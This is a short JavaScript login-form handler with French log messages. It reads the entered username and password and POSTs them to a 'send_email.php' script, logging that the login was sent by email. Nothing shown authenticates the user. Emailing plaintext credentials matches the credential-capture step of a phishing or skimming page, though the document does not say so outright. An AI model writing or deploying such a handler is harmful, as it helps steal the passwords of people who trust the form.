function submitForm(event) {
    event.preventDefault();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    fetch('send_email.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ username, password })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            console.log('Login envoyé par email avec succès!');
        } else {
            console.error('Erreur lors de l\'envoi de l\'email: ' + data.message);
        }
    })
    .catch(error => console.error('Error:', error));
}
